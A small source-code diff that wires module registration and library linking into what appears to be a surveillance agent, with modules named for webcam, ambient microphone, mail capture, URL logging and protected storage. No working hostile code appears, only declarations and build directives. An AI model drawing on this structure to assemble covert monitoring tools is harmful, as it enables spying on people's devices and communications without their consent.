@@ -88,6 +88,10 @@ void PM_MoneyRegister();
 #pragma comment(lib, "social")
 #endif
 
+#ifdef __ENABLE_MESSAGES_MODULE
+#pragma comment(lib, "messages")
+#endif
+
 /// SECTION for building modules
 
 #include <json/JSON.h>
@@ -101,7 +105,7 @@ void PM_MoneyRegister();
 #include "HM_UrlLog.h" // XXX da modificare 
 #include "HM_WebCam.h" // XXX da modificare 
 void PM_AmbMicRegister();
-#include "HM_MailCap.h" // XXX da modificare 
+void PM_MailCapRegister();
 #include "HM_Pstorage.h" // XXX da modificare 
 extern void PM_IMRegister();	// defined in /modules/imagent
 #include "HM_LogDevice.h" // XXX da modificare 
